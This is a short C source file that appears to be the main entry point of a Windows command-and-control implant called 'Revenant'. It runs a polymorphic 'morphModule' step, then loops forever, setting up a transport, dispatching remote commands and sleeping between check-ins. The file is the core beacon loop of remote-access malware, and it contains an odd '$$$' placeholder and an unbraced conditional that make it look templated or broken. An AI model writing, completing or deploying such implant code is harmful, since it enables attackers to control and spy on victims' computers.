#pragma clang diagnostic push
#pragma ide diagnostic ignored "EndlessLoop"

#include "Revenant.h"
#include "Core.h"
#include "Transport.h"
#include "Command.h"
#include "Poly.h"

INSTANCE Instance = { 0 };

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd ) {
    morphModule();

    $$$

    RvntInit();


    do {
        if (!Instance.Session.Connected) {
            if(TransportInit())

            CommandDispatcher();

        }


        Sleep( Instance.Config.Sleeping * 1000 );

    } while ( TRUE );
}

#pragma clang diagnostic pop